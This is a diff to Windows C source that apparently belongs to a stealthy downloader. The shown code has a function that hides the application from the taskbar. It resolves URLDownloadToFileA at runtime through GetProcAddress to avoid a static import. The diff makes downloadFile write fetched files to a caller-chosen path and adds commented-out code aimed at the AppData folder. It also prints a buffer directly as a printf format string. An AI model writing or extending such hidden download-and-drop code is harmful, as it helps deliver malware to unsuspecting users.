@@ -2,6 +2,8 @@
 #include <wincrypt.h>
 #include <shlobj.h>
 #include <shlwapi.h>
+#include <wchar.h>
+#include <stdio.h>
 
 HCRYPTPROV prov = NULL;
 
@@ -40,9 +42,15 @@ int hideAppInTaskbar(void)
     return 0;
 }
 
-void downloadFile(char url[])
+void downloadFile(char url[], char filename[])
 {
-    char destination[] = "index.php";
+
+    // WCHAR path[512];
+    // SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path);
+
+    // wcscat(path, L"\\hey");
+    // wprintf(L"Path: %s\n", path);
+
     char buffer[512];
 
     HRESULT dl;
@@ -51,13 +59,13 @@ void downloadFile(char url[])
     URLDownloadToFileA_t xURLDownloadToFileA;
     xURLDownloadToFileA = (URLDownloadToFileA_t)GetProcAddress(LoadLibraryA("urlmon"), "URLDownloadToFileA");
 
-    dl = xURLDownloadToFileA(NULL, url, destination, 0, NULL);
+    dl = xURLDownloadToFileA(NULL, url, filename, 0, NULL);
 
-    sprintf(buffer, "Downloading File From: %s, To: %s", url, destination);
+    sprintf(buffer, "Downloading File From: %s, To: %s", url, filename);
 
     if (dl == S_OK)
     {
-        sprintf(buffer, "File Successfully Downloaded To: %s", destination);
+        sprintf(buffer, "File Successfully Downloaded To: %s", filename);
         printf(buffer);
     }
     else if (dl == E_OUTOFMEMORY)
